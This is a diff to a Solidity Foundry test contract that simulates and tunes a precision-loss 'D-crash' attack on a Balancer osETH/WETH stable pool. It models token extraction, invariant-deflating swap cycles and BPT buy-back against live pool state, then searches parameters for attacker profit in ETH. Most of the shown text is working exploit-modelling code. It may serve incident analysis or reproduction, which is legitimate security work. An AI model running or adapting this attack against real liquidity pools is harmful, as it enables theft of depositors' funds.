@@ -8,6 +8,7 @@ import {IVault} from "src/interfaces/IVault.sol";
 import {IERC20} from "forge-std/interfaces/IERC20.sol";
 import {FixedPoint} from "src/FixedPoint.sol";
 import {SwapMath} from "src/SwapMath.sol";
+import {StableMath} from "src/StableMath.sol";
 
 contract SearchParams is Test {
     using FixedPoint for uint256;
@@ -66,6 +67,24 @@ contract SearchParams is Test {
         return (bal[0], bal[1]);
     }
 
+    /// @notice Like trySwap but also returns the post-swap invariant (for invariant threading)
+    function trySwapWithInvariant(
+        uint256 balWETH,
+        uint256 balOSETH,
+        uint256 indexIn,
+        uint256 indexOut,
+        uint256 swapOutAmount
+    ) external view returns (uint256 newBalWETH, uint256 newBalOSETH, uint256 postInvariant) {
+        uint256[] memory bal = new uint256[](2);
+        uint256[] memory scalingFactors = new uint256[](2);
+        bal[0] = balWETH;
+        bal[1] = balOSETH;
+        scalingFactors[0] = sf[0];
+        scalingFactors[1] = sf[1];
+        (bal, postInvariant) = swapMath.getAfterSwapOutBalancesAndPostInvariant(bal, scalingFactors, indexIn, indexOut, swapOutAmount, amp, swapFeePercentage);
+        return (bal[0], bal[1], postInvariant);
+    }
+
     /// @notice Truncate to keep only the 2 most significant digits.
     /// e.g. 324816 -> 320000, 67123 -> 67000, 1234 -> 1200
     /// Formula: floor(x / 10^(d-2)) * 10^(d-2), where d = number of digits.
@@ -112,6 +131,27 @@ contract SearchParams is Test {
         revert("Swap 3 failed after 3 attempts");
     }
 
+    /// @notice Like _computeSwap3 but also returns the post-swap invariant
+    function _computeSwap3WithInvariant(uint256 balWETH, uint256 balOSETH) external returns (uint256, uint256, uint256, uint256) {
+        uint256 swapOut3 = _truncateToTop2Digits(balWETH);
+
+        try this.trySwapWithInvariant(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o, uint256 inv) {
+            return (swapOut3, w, o, inv);
+        } catch {}
+
+        swapOut3 = swapOut3 * 9 / 10;
+        try this.trySwapWithInvariant(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o, uint256 inv) {
+            return (swapOut3, w, o, inv);
+        } catch {}
+
+        swapOut3 = swapOut3 * 9 / 10;
+        try this.trySwapWithInvariant(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o, uint256 inv) {
+            return (swapOut3, w, o, inv);
+        } catch {}
+
+        revert("Swap 3 (inv) failed after 3 attempts");
+    }
+
     /// @notice Simulate one D-crash round (3 swaps). Reverts if any swap fails.
     /// Called via this.simulateOneRound() so try/catch can intercept reverts.
     /// Swap 3 uses binary search to find maximum extractable WETH.
@@ -141,6 +181,35 @@ contract SearchParams is Test {
         try this._computeSwap3(tempBal[0], tempBal[1]) returns (uint256 swapOut3, uint256 w, uint256 o) {
             return (w, o);
         } catch {revert("Swap 3 failed");}
+    }
+
+    /// @notice Like simulateOneRound but also returns the stored invariant after the last swap
+    function simulateOneRoundWithInvariant(
+        uint256 balWETH,
+        uint256 balOSETH,
+        uint256 trickAmt
+    ) external returns (uint256 newBalWETH, uint256 newBalOSETH, uint256 postRoundInvariant) {
+        uint256[] memory currentBal = new uint256[](2);
+        uint256[] memory tempBal;
+        uint256[] memory scalingFactors = new uint256[](2);
+
+        // Swap 1: drain osETH to trickAmt + 1
+        currentBal[0] = balWETH;
+        currentBal[1] = balOSETH;
+        scalingFactors[0] = sf[0];
+        scalingFactors[1] = sf[1];
+        uint256 swapOut1 = currentBal[1] - trickAmt - 1;
+        tempBal = swapMath.getAfterSwapOutBalances(currentBal, scalingFactors, 0, 1, swapOut1, amp, swapFeePercentage);
+
+        // Swap 2: drain remaining trickAmt from osETH (triggers precision loss)
+        scalingFactors[0] = sf[0];
+        scalingFactors[1] = sf[1];
+        tempBal = swapMath.getAfterSwapOutBalances(tempBal, scalingFactors, 0, 1, trickAmt, amp, swapFeePercentage);
+
+        // Swap 3: truncation + 9/10 retry — returns invariant
+        try this._computeSwap3WithInvariant(tempBal[0], tempBal[1]) returns (uint256, uint256 w, uint256 o, uint256 inv) {
+            return (w, o, inv);
+        } catch {revert("Swap 3 (inv) failed");}
     }
 
     /// @notice Swap 3 using 999/1000 method instead of truncation
@@ -343,9 +412,17 @@ contract SearchParams is Test {
         uint256 bW = balWETH;
         uint256 bO = balOSETH;
         uint256 supply = virtualSupply;
-
+        // Track stored invariant for between-swap protocol fees.
+        // Initialize to fresh invariant so the first check yields no fee
+        // (real contract's stored invariant from Step 1 is higher than post-cycling fresh).
+        uint256 storedInvariant = _getInvariant(bW, bO);
         for (uint256 i = 0; i < swapCount; i++) {
             uint256 preInvariant = _getInvariant(bW, bO);
+
+            // Between-swap fee: _payProtocolFeesBeforeJoinExit mints BPT if
+            // fresh invariant exceeds stored invariant from the previous swap.
+            supply += _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
+
             uint256 preSupply = supply;
 
             uint256[] memory bal = new uint256[](2);
@@ -355,25 +432,24 @@ contract SearchParams is Test {
             scalingFactors[0] = sf[0];
             scalingFactors[1] = sf[1];
 
-            // Alternate: even indices use WETH (index 0), odd use osETH (index 1)
             uint256 tokenIndex = i % 2 == 0 ? 0 : 1;
 
-            uint256 amountIn = swapMath.getTokenInForBptOut(
+            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(
                 bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage
             );
 
-            // Update pool token balances (full amountIn including fee, as the Vault does)
             if (tokenIndex == 0) {
                 bW += amountIn;
             } else {
                 bO += amountIn;
             }
-            // BPT leaves the pool → virtualSupply increases
             supply += bptAmounts[i];
             totalCost += amountIn;
 
-            // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
-            supply += _calcProtocolFeeBpt(preInvariant, preSupply, bW, bO, supply);
+            // After-swap fee: _updateInvariantAfterJoinExit
+            supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
+            // Store the post-swap invariant for the next between-swap check
+            storedInvariant = postInv;
         }
     }
 
@@ -398,8 +474,14 @@ contract SearchParams is Test {
         }
         console.log("Step3 totalBpt:", totalBpt);
 
+        uint256 storedInvariant = _getInvariant(bW, bO);
         for (uint256 i = 0; i < swapCount; i++) {
             uint256 preInvariant = _getInvariant(bW, bO);
+
+            // Between-swap fee
+            uint256 beforeFee = _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
+            supply += beforeFee;
+
             uint256 preSupply = supply;
 
             uint256[] memory bal = new uint256[](2);
@@ -411,7 +493,7 @@ contract SearchParams is Test {
 
             uint256 tokenIndex = i % 2 == 0 ? 0 : 1;
 
-            uint256 amountIn = swapMath.getTokenInForBptOut(
+            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(
                 bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage
             );
 
@@ -421,6 +503,9 @@ contract SearchParams is Test {
             console.log("    tokenIn:", amountIn);
             console.log("    supply_before:", supply);
             console.log("    balW:", bW, "balO:", bO);
+            if (beforeFee > 0) {
+                console.log("    beforeSwapFeeBpt:", beforeFee);
+            }
 
             if (tokenIndex == 0) {
                 bW += amountIn;
@@ -430,12 +515,13 @@ contract SearchParams is Test {
             supply += bptAmounts[i];
             totalCost += amountIn;
 
-            // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
-            uint256 protocolBpt = _calcProtocolFeeBpt(preInvariant, preSupply, bW, bO, supply);
+            // After-swap fee
+            uint256 protocolBpt = _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
             if (protocolBpt > 0) {
                 console.log("    protocolBptMinted:", protocolBpt);
             }
             supply += protocolBpt;
+            storedInvariant = postInv;
         }
     }
 
@@ -496,6 +582,12 @@ contract SearchParams is Test {
         uint256 bO = realOSETH;
         uint256 supply = bptSupply;
 
+        // Use the fresh invariant from current balances for all steps.
+        // The real Balancer _beforeJoinExit updates the stored invariant to freshInvariant
+        // before the first swap, so step 0 uses freshInvariant as preJoinExitInvariant.
+        // (The stored _lastPostJoinExitInvariant may reflect an older osETH rate and would
+        //  be significantly lower than fresh, causing over-estimation of protocol fees.)
+
         // Interleave: alternate WETH and osETH exits (matching real attack's swap ordering)
         uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
         for (uint256 i = 0; i < maxSwaps; i++) {
@@ -513,13 +605,14 @@ contract SearchParams is Test {
                 uint256 bptIn = swapMath.getBptInForTokenOut(
                     bal, scalingFactors, 0, tokenOut, supply, amp, swapFeePercentage
                 );
+                uint256 postInv = _calcPostInvariant(bW, bO, 0, tokenOut, false);
                 bW -= tokenOut;
                 supply -= bptIn;
                 totalBptSold += bptIn;
                 totalTokensOut += tokenOut;
 
                 // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
-                supply += _calcProtocolFeeBpt(preInvariant, preSupply, bW, bO, supply);
+                supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
             }
             // osETH exit: BPT → osETH (GIVEN_OUT)
             if (i < osethCount) {
@@ -535,16 +628,39 @@ contract SearchParams is Test {
                 uint256 bptIn = swapMath.getBptInForTokenOut(
                     bal, scalingFactors, 1, tokenOut, supply, amp, swapFeePercentage
                 );
+                uint256 postInv = _calcPostInvariant(bW, bO, 1, tokenOut, false);
                 bO -= tokenOut;
                 supply -= bptIn;
                 totalBptSold += bptIn;
                 totalTokensOut += tokenOut;
 
                 // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
-                supply += _calcProtocolFeeBpt(preInvariant, preSupply, bW, bO, supply);
+                supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
             }
         }
         remainingSupply = supply;
+    }
+
+    /// @notice Compute post-swap invariant using Balancer's upscale-then-operate order.
+    /// In the real contract, balances are upscaled BEFORE the token delta is applied.
+    /// This avoids 1-wei rounding discrepancies from floor((a±b)*s/1e18) vs floor(a*s/1e18)±floor(b*s/1e18).
+    function _calcPostInvariant(
+        uint256 preBW,
+        uint256 preBO,
+        uint256 tokenIndex,
+        uint256 tokenDelta,
+        bool isJoin
+    ) internal view returns (uint256) {
+        uint256[] memory bal = new uint256[](2);
+        bal[0] = preBW * sf[0] / FixedPoint.ONE;
+        bal[1] = preBO * sf[1] / FixedPoint.ONE;
+        uint256 scaledDelta = tokenDelta * sf[tokenIndex] / FixedPoint.ONE;
+        if (isJoin) {
+            bal[tokenIndex] += scaledDelta;
+        } else {
+            bal[tokenIndex] -= scaledDelta;
+        }
+        return StableMath._calculateInvariant(amp, bal);
     }
 
     /// @notice Calculate protocol fee BPT to mint after a join/exit swap.
@@ -555,11 +671,9 @@ contract SearchParams is Test {
     function _calcProtocolFeeBpt(
         uint256 preInvariant,
         uint256 preSupply,
-        uint256 postBalW,
-        uint256 postBalO,
+        uint256 postInvariant,
         uint256 postSupply
     ) internal view returns (uint256) {
-        uint256 postInvariant = _getInvariant(postBalW, postBalO);
 
         // feelessInvariant = preInvariant * (postSupply / preSupply)
         // This is what D would be if the exit were proportional (no swap fee)
@@ -584,6 +698,50 @@ contract SearchParams is Test {
         return (postSupply * protocolOwnership) / protocolOwnership.complement();
     }
 
+    /// @notice Calculate protocol fee BPT minted by _payProtocolFeesBeforeJoinExit between
+    /// consecutive BPT swaps within the same transaction.
+    /// Within a single tx (rates unchanged), the three growth invariants collapse to
+    /// freshInvariant, so the formula simplifies to:
+    ///   ownership = (freshInv - storedInv).divDown(freshInv).mulDown(protocolSwapFeePercentage)
+    ///   feeBpt = supply * ownership / complement(ownership)
+    function _calcBeforeSwapFeeBpt(
+        uint256 freshInvariant,
+        uint256 lastPostJoinExitInvariant,
+        uint256 supply
+    ) internal view returns (uint256) {
+        if (freshInvariant <= lastPostJoinExitInvariant) return 0;
+        uint256 delta = freshInvariant - lastPostJoinExitInvariant;
+        // Matches _getProtocolPoolOwnershipPercentage: divDown then mulDown (two separate roundings)
+        uint256 swapFeeFraction = delta * FixedPoint.ONE / freshInvariant; // divDown
+        uint256 ownership = swapFeeFraction * protocolSwapFeePercentage / FixedPoint.ONE; // mulDown
+        if (ownership == 0) return 0;
+        // ExternalFees.bptForPoolOwnershipPercentage: Math.divDown(Math.mul(supply, ownership), complement)
+        return (supply * ownership) / ownership.complement();
+    }
+
+    /// @notice Calculate BPT that the real Balancer contract mints as yield fees before the
+    /// first swap of a batchSwap batch.
+    /// Mirrors ComposableStablePool._payProtocolFeesBeforeJoinExit:
+    ///   yieldOwnership = (freshInvariant - storedInvariant) / freshInvariant * yieldFeePercentage
+    ///   yieldFeeBpt = supply * yieldOwnership / (1 - yieldOwnership)
+    function _calcYieldFeeBpt(
+        uint256 freshInvariant,
+        uint256 storedInvariant,
+        uint256 supply
+    ) internal view returns (uint256) {
+        if (freshInvariant <= storedInvariant) return 0;
+        // protocolYieldFeePercentage is at cache type 2 (YIELD) per IBasePool.sol comment
+        uint256 yieldFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(2);
+        if (yieldFeePercentage == 0) return 0;
+        uint256 delta = freshInvariant - storedInvariant;
+        // fraction = delta / freshInvariant  (FixedPoint.divDown)
+        // yieldOwnership = fraction * yieldFeePercentage  (FixedPoint.mulDown)
+        uint256 yieldOwnership = (delta * FixedPoint.ONE / freshInvariant) * yieldFeePercentage / FixedPoint.ONE;
+        if (yieldOwnership == 0) return 0;
+        // bptForPoolOwnershipPercentage: supply * ownership / complement
+        return (supply * yieldOwnership) / yieldOwnership.complement();
+    }
+
     /// @notice Helper: compute profit for a given remain value using high-fidelity simulation.
     /// Chains virtualSupply from Step 1 → Step 3 for accurate pricing.
     function _computeProfit(
@@ -597,12 +755,13 @@ contract SearchParams is Test {
         (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply) =
             _simulateStep1Extraction(realWETH, realOSETH, remain, totalBPT);
         uint256 sumAfter = wAfter + oAfter;
-        if (2 * remain < sumAfter) return 0; // cycling increased balances (shouldn't happen, safety)
-        uint256 cyclingCost = 2 * remain - sumAfter;
+        // The pool loses (2*remain - sumAfter) tokens during cycling, which flow to the attacker.
+        // This is a GAIN for the attacker, not a cost.
+        uint256 cyclingGain = sumAfter < 2 * remain ? 2 * remain - sumAfter : 0;
         // Step 2 (cycling) doesn't involve BPT, so virtualSupply stays at postStep1Supply
         uint256 repaymentCost = _simulateStep3Repayment(wAfter, oAfter, bptSold, postStep1Supply);
-        if (tokensExtracted < cyclingCost + repaymentCost) return 0; // net loss
-        return tokensExtracted - cyclingCost - repaymentCost;
+        if (tokensExtracted + cyclingGain < repaymentCost) return 0; // net loss
+        return tokensExtracted + cyclingGain - repaymentCost;
     }
 
     function test_searchRemainBalance() public {
@@ -832,18 +991,13 @@ contract SearchParams is Test {
         (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
         uint256 realWETH = realBal[0];
         uint256 realOSETH = realBal[2];
-        // Use the swap-math virtual supply: totalSupply - registeredBptBalance
-        // NOT getActualSupply(), which further subtracts protocol fees
-        uint256 totalSupplyBPT = IERC20(address(OSETH_BPT)).totalSupply();
-        uint256 registeredBpt = realBal[1]; // BPT at index 1
-        uint256 totalBPT = totalSupplyBPT - registeredBpt;
+        // Use getActualSupply() which equals virtualSupply + protocolFeeAmount,
+        // matching the real pool's preJoinExitSupply after _payProtocolFeesBeforeJoinExit
+        uint256 totalBPT = OSETH_BPT.getActualSupply();
 
         console.log("Real WETH:", realWETH);
         console.log("Real osETH:", realOSETH);
-        console.log("BPT supply (virtualSupply):", totalBPT);
-        console.log("  totalSupply:", totalSupplyBPT);
-        console.log("  registeredBpt:", registeredBpt);
-        console.log("  getActualSupply:", OSETH_BPT.getActualSupply());
+        console.log("BPT supply (actualSupply):", totalBPT);
 
         uint256 remain = 67000;
         uint256 N = 30;
@@ -870,8 +1024,9 @@ contract SearchParams is Test {
         console.log("D after cycling:", dAfter);
         console.log("bal after cycling: WETH=", balWETH, "osETH=", balOSETH);
 
-        uint256 cyclingCost = 2 * remain - (balWETH + balOSETH);
-        console.log("Cycling cost (tokens consumed):", cyclingCost);
+        // Pool lost (2*remain - sumAfter) tokens during cycling → attacker gained them
+        uint256 cyclingGain = 2 * remain - (balWETH + balOSETH);
+        console.log("Cycling gain (tokens extracted from pool by D-crash):", cyclingGain);
 
         // Step 3: simulate buying back BPT with dynamic D recovery
         // The attacker targets 100.3% of getActualSupply() to ensure full liquidation
@@ -884,7 +1039,7 @@ contract SearchParams is Test {
         console.log("Repayment cost (tokens to buy back BPT):", repaymentCost);
 
         // Net profit = tokens left over
-        uint256 profit = tokensExtracted - cyclingCost - repaymentCost;
+        uint256 profit = tokensExtracted + cyclingGain - repaymentCost;
         console.log("=== NET PROFIT ===");
         console.log("Profit (token wei):", profit);
         console.log("Profit (ETH):", profit / 1e18);
@@ -1099,9 +1254,7 @@ contract SearchParams is Test {
         (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
         uint256 realWETH = realBal[0];
         uint256 realOSETH = realBal[2];
-        uint256 totalSupplyBPT = IERC20(address(OSETH_BPT)).totalSupply();
-        uint256 registeredBpt = realBal[1];
-        uint256 totalBPT = totalSupplyBPT - registeredBpt;
+        uint256 totalBPT = OSETH_BPT.getActualSupply();
         uint256 N = 30;
 
         uint256[2] memory remains = [uint256(67000), uint256(94000)];
@@ -1126,8 +1279,8 @@ contract SearchParams is Test {
             console.log("Step2 D_before:", dBefore, "D_after:", dAfter);
             console.log("Step2 balW:", bW, "balO:", bO);
             console.log("Step2 D_deflation_bps:", (dBefore - dAfter) * 10000 / dBefore);
-            uint256 cyclingCost = 2 * remain - (bW + bO);
-            console.log("Step2 cyclingCost:", cyclingCost);
+            uint256 cyclingGain = 2 * remain - (bW + bO);
+            console.log("Step2 cyclingGain:", cyclingGain);
 
             // Step 3
             uint256 bptTarget = totalBPT * 10030 / 10000;
@@ -1137,7 +1290,7 @@ contract SearchParams is Test {
             console.log("Step3 repaymentCost:", repaymentCost);
 
             // Profit
-            uint256 profit = tokensExtracted - cyclingCost - repaymentCost;
+            uint256 profit = tokensExtracted + cyclingGain - repaymentCost;
             console.log("NET PROFIT (wei):", profit);
             console.log("NET PROFIT (ETH):", profit / 1e18);
             console.log("");
@@ -1152,9 +1305,7 @@ contract SearchParams is Test {
         (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
         uint256 realWETH = realBal[0];
         uint256 realOSETH = realBal[2];
-        uint256 totalSupplyBPT = IERC20(address(OSETH_BPT)).totalSupply();
-        uint256 registeredBpt = realBal[1];
-        uint256 totalBPT = totalSupplyBPT - registeredBpt;
+        uint256 totalBPT = OSETH_BPT.getActualSupply();
 
         console.log("=== PROFIT LANDSCAPE SCAN ===");
         console.log("trickAmt:", trickAmt);
@@ -1270,6 +1421,31 @@ contract SearchParams is Test {
 
     // ─── Detailed per-token breakdown ───────────────────────────────────
 
+    /// @notice Single-step helper to avoid stack-too-deep in the extraction loop.
+    /// Computes BPT burned, protocol fee minted, and returns updated (newBal, newSupply, bptIn).
+    /// tokenIndex: 0 = WETH, 1 = osETH. newBal is the post-exit balance of the exited token.
+    function _doSingleExitStep(
+        uint256 bW,
+        uint256 bO,
+        uint256 supply,
+        uint256 tokenIndex,
+        uint256 tokenOut,
+        uint256 preInvariant
+    ) internal view returns (uint256 newBal, uint256 newSupply, uint256 bptIn) {
+        uint256[] memory bal = new uint256[](2);
+        uint256[] memory scalingFactors = new uint256[](2);
+        bal[0] = bW; bal[1] = bO;
+        scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
+        bptIn = swapMath.getBptInForTokenOut(bal, scalingFactors, tokenIndex, tokenOut, supply, amp, swapFeePercentage);
+        uint256 postInv = _calcPostInvariant(bW, bO, tokenIndex, tokenOut, false);
+        uint256 postBW = tokenIndex == 0 ? bW - tokenOut : bW;
+        uint256 postBO = tokenIndex == 1 ? bO - tokenOut : bO;
+        uint256 postSupply = supply - bptIn;
+        uint256 feeBpt = _calcProtocolFeeBpt(preInvariant, supply, postInv, postSupply);
+        newBal = tokenIndex == 0 ? postBW : postBO;
+        newSupply = postSupply + feeBpt;
+    }
+
     function _simulateStep1ExtractionDetailed(
         uint256 realWETH,
         uint256 realOSETH,
@@ -1283,40 +1459,75 @@ contract SearchParams is Test {
         uint256 bO = realOSETH;
         uint256 supply = bptSupply;
 
+        // Use fresh invariant from current balances for all steps (matches _simulateStep1Extraction).
+
         uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
         for (uint256 i = 0; i < maxSwaps; i++) {
             if (i < wethCount) {
-                uint256 preInvariant = _getInvariant(bW, bO);
-                uint256 preSupply = supply;
-                uint256 tokenOut = wethAmounts[i];
-                uint256[] memory bal = new uint256[](2);
-                uint256[] memory scalingFactors = new uint256[](2);
-                bal[0] = bW; bal[1] = bO;
-                scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
-                uint256 bptIn = swapMath.getBptInForTokenOut(bal, scalingFactors, 0, tokenOut, supply, amp, swapFeePercentage);
-                bW -= tokenOut;
-                supply -= bptIn;
+                uint256 preInv = _getInvariant(bW, bO);
+                uint256 bptIn;
+                (bW, supply, bptIn) = _doSingleExitStep(bW, bO, supply, 0, wethAmounts[i], preInv);
                 totalBptSold += bptIn;
-                totalWethOut += tokenOut;
-                supply += _calcProtocolFeeBpt(preInvariant, preSupply, bW, bO, supply);
+                totalWethOut += wethAmounts[i];
+                console.log("[SP1] step", i, "WETH supply_after:", supply);
             }
             if (i < osethCount) {
-                uint256 preInvariant = _getInvariant(bW, bO);
-                uint256 preSupply = supply;
-                uint256 tokenOut = osethAmounts[i];
-                uint256[] memory bal = new uint256[](2);
-                uint256[] memory scalingFactors = new uint256[](2);
-                bal[0] = bW; bal[1] = bO;
-                scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
-                uint256 bptIn = swapMath.getBptInForTokenOut(bal, scalingFactors, 1, tokenOut, supply, amp, swapFeePercentage);
-                bO -= tokenOut;
-                supply -= bptIn;
+                uint256 preInv = _getInvariant(bW, bO);
+                uint256 bptIn;
+                (bO, supply, bptIn) = _doSingleExitStep(bW, bO, supply, 1, osethAmounts[i], preInv);
                 totalBptSold += bptIn;
-                totalOsethOut += tokenOut;
-                supply += _calcProtocolFeeBpt(preInvariant, preSupply, bW, bO, supply);
+                totalOsethOut += osethAmounts[i];
+                console.log("[SP1] step", i, "OSETH supply_after:", supply);
             }
         }
         remainingSupply = supply;
+    }
+
+    /// @notice Debug version with per-step logging matching EXP output format
+    function _simulateStep3RepaymentDetailedWithLog(
+        uint256 balWETH,
+        uint256 balOSETH,
+        uint256 bptToBuy,
+        uint256 virtualSupply
+    ) internal returns (uint256 wethCost, uint256 osethCost, uint256 totalBptBought) {
+        (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);
+
+        uint256 bW = balWETH;
+        uint256 bO = balOSETH;
+        uint256 supply = virtualSupply;
+
+        console.log("[SP] Phase3 step count:", swapCount);
+        uint256 storedInvariant = _getInvariant(bW, bO);
+        for (uint256 i = 0; i < swapCount; i++) {
+            totalBptBought += bptAmounts[i];
+            uint256 preInvariant = _getInvariant(bW, bO);
+            // Between-swap fee
+            uint256 beforeFee = _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
+            supply += beforeFee;
+            uint256 preSupply = supply;
+            uint256[] memory bal = new uint256[](2);
+            uint256[] memory scalingFactors = new uint256[](2);
+            bal[0] = bW; bal[1] = bO;
+            scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
+            uint256 tokenIndex = i % 2 == 0 ? 0 : 1;
+            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage);
+            console.log("[SP] Phase3 step", i, "BPT amount:", bptAmounts[i]);
+            console.log("[SP]   assetIn:", tokenIndex == 0 ? 0 : 2);
+            console.log("[SP]   tokenIn:", amountIn);
+            console.log("[SP]   supply:", supply);
+            if (beforeFee > 0) {
+                console.log("[SP]   beforeSwapFeeBpt:", beforeFee);
+            }
+            if (tokenIndex == 0) { bW += amountIn; wethCost += amountIn; }
+            else { bO += amountIn; osethCost += amountIn; }
+            supply += bptAmounts[i];
+            uint256 feeBpt = _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
+            supply += feeBpt;
+            console.log("[SP]   supply after:", supply);
+            console.log("[SP]   feeBpt:", feeBpt);
+            console.log("[SP]   preInv:", preInvariant, "postInv:", postInv);
+            storedInvariant = postInv;
+        }
     }
 
     function _simulateStep3RepaymentDetailed(
@@ -1331,20 +1542,23 @@ contract SearchParams is Test {
         uint256 bO = balOSETH;
         uint256 supply = virtualSupply;
 
+        uint256 storedInvariant = _getInvariant(bW, bO);
         for (uint256 i = 0; i < swapCount; i++) {
             totalBptBought += bptAmounts[i];
             uint256 preInvariant = _getInvariant(bW, bO);
+            supply += _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
             uint256 preSupply = supply;
             uint256[] memory bal = new uint256[](2);
             uint256[] memory scalingFactors = new uint256[](2);
             bal[0] = bW; bal[1] = bO;
             scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
             uint256 tokenIndex = i % 2 == 0 ? 0 : 1;
-            uint256 amountIn = swapMath.getTokenInForBptOut(bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage);
+            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage);
             if (tokenIndex == 0) { bW += amountIn; wethCost += amountIn; }
             else { bO += amountIn; osethCost += amountIn; }
             supply += bptAmounts[i];
-            supply += _calcProtocolFeeBpt(preInvariant, preSupply, bW, bO, supply);
+            supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
+            storedInvariant = postInv;
         }
     }
 
@@ -1354,14 +1568,38 @@ contract SearchParams is Test {
         (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
         uint256 realWETH = realBal[0];
         uint256 realOSETH = realBal[2];
-        uint256 totalSupplyBPT = IERC20(address(OSETH_BPT)).totalSupply();
-        uint256 registeredBpt = realBal[1];
-        uint256 totalBPT = totalSupplyBPT - registeredBpt;
+        uint256 totalBPT = OSETH_BPT.getActualSupply();
 
         uint256 remain = 67000;
         uint256 N = 30;
 
-        console.log("=== DETAILED TOKEN BREAKDOWN: remain=67000, N=30 ===");
+        // Diagnostic: compare lastStoredInvariant vs fresh _getInvariant
+        (, uint256 lastStoredInvariant) = OSETH_BPT.getLastJoinExitData();
+        uint256 freshInvariant = _getInvariant(realWETH, realOSETH);
+        console.log("[SP] lastStoredInvariant (getLastJoinExitData):", lastStoredInvariant);
+        console.log("[SP] freshInvariant (_getInvariant):", freshInvariant);
+        console.log("[SP] diff (stored - fresh):", lastStoredInvariant > freshInvariant ? lastStoredInvariant - freshInvariant : 0);
+        console.log("[SP] diff (fresh - stored):", freshInvariant > lastStoredInvariant ? freshInvariant - lastStoredInvariant : 0);
+
+        // Diagnostic: yield fee that the real Balancer mints before the first swap
+        // Per IBasePool.sol comment: SWAP=0, AUM=1, YIELD=2
+        uint256 protocolYieldFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(2);
+        console.log("[SP] protocolYieldFeePercentage (type 1):", protocolYieldFeePercentage);
+        console.log("[SP] protocolSwapFeePercentage  (type 0):", protocolSwapFeePercentage);
+        console.log("[SP] totalBPT:", totalBPT);
+        if (freshInvariant > lastStoredInvariant && protocolYieldFeePercentage > 0) {
+            uint256 delta = freshInvariant - lastStoredInvariant;
+            // yieldOwnership = delta / freshInvariant * yieldFeePercentage  (FixedPoint.mulDown(divDown))
+            uint256 yieldOwnership = (delta * FixedPoint.ONE / freshInvariant) * protocolYieldFeePercentage / FixedPoint.ONE;
+            // yieldFeeBpt = supply * yieldOwnership / complement(yieldOwnership)
+            uint256 yieldFeeBpt = totalBPT * yieldOwnership / yieldOwnership.complement();
+            console.log("[SP] yieldOwnership:", yieldOwnership);
+            console.log("[SP] yieldFeeBpt (pre-Phase1 minting):", yieldFeeBpt);
+        } else {
+            console.log("[SP] yieldFeeBpt: 0 (no yield fee or fee rate is 0)");
+        }
+
+        console.log("=== DETAILED TOKEN BREAKDOWN: remain=94000, N=30 ===");
 
         // Step 1: extract tokens (per-token)
         (uint256 wethOut, uint256 osethOut, uint256 bptSold, uint256 postStep1Supply) =
@@ -1371,29 +1609,50 @@ contract SearchParams is Test {
         console.log("osETH extracted:", osethOut);
         console.log("BPT sold:", bptSold);
 
-        // Step 2: D-collapse cycling (per-token costs)
+        // Step 2: D-collapse cycling (per-token costs) — thread invariant
         uint256 bW = remain; uint256 bO = remain;
-        for (uint256 r = 0; r < N; r++) {
-            (bW, bO) = this.simulateOneRound(bW, bO, trickAmt);
-        }
-        uint256 wethCostStep2 = remain - bW;
-        uint256 osethCostStep2 = remain - bO;
+        uint256 phase2Invariant; // will hold the stored invariant after Phase 2's last swap
         console.log("--- Step 2: D-Collapse Cycling ---");
-        console.log("WETH consumed:", wethCostStep2);
-        console.log("osETH consumed:", osethCostStep2);
+        console.log("[SP] trickAmt:", trickAmt);
+        console.log("[SP] sf[0]:", sf[0]);
+        console.log("[SP] sf[1]:", sf[1]);
+        for (uint256 r = 0; r < N; r++) {
+            (bW, bO, phase2Invariant) = this.simulateOneRoundWithInvariant(bW, bO, trickAmt);
+            console.log("[SP] Round:", r);
+            console.log("[SP]   bW:", bW);
+            console.log("[SP]   bO:", bO);
+        }
+        console.log("[SP] phase2Invariant (stored after last round):", phase2Invariant);
+        // Pool WETH dropped from remain→bW; that difference flowed to attacker (GAIN, not cost)
+        uint256 wethGainStep2 = remain - bW;
+        uint256 osethGainStep2 = remain - bO;
